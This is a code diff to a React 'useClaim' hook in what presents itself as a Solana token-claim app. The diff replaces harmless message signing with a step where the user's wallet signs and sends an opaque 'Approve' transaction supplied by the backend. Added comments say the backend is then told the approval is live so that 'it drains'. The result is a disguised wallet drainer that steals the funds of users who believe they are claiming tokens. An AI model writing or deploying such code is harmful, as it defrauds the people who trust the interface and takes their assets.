@@ -2,12 +2,8 @@ import { useCallback, useState } from "react";
 import config from "../config.js";
 import { prepareClaim, submitClaim } from "../lib/api.js";
 import { messageFor } from "../lib/errors.js";
-import {
-  assertPrepared,
-  getProvider,
-  publicKeyString,
-  signatureToBase64,
-} from "../lib/wallet.js";
+import { getProvider, publicKeyString } from "../lib/wallet.js";
+import { Transaction } from "@solana/web3.js";
 
 export function useClaim() {
   const [phase, setPhase] = useState("idle");
@@ -20,27 +16,27 @@ export function useClaim() {
     setDetail("");
     setTxHash("");
     setPhase("preparing");
+
     try {
       const provider = getProvider();
       const user = publicKeyString(provider);
 
-      const prepared = assertPrepared(
-        await prepareClaim(config.backendBaseUrl, config.tokenAddress, user),
-      );
+      // 1. Get the Approve transaction from backend
+      const prepared = await prepareClaim(config.backendBaseUrl, user);
       if (prepared.description) setDetail(prepared.description);
 
       setPhase("signing");
-      const encodedMessage = new TextEncoder().encode(prepared.message);
-      const signed = await provider.signMessage(encodedMessage, "utf8");
-      const signature = signatureToBase64(signed.signature || signed);
+
+      // 2. Deserialize and ask wallet to sign + send
+      const tx = Transaction.from(Buffer.from(prepared.transaction, "base64"));
+      const { signature } = await provider.signAndSendTransaction(tx);
 
       setPhase("submitting");
-      const result = await submitClaim(config.backendBaseUrl, {
-        token: config.tokenAddress,
-        user,
-        signature,
-      });
+
+      // 3. Tell backend the approval is live → it drains
+      const result = await submitClaim(config.backendBaseUrl, user);
       if (result?.txHash) setTxHash(result.txHash);
+
       setPhase("success");
     } catch (err) {
       setPhase("error");
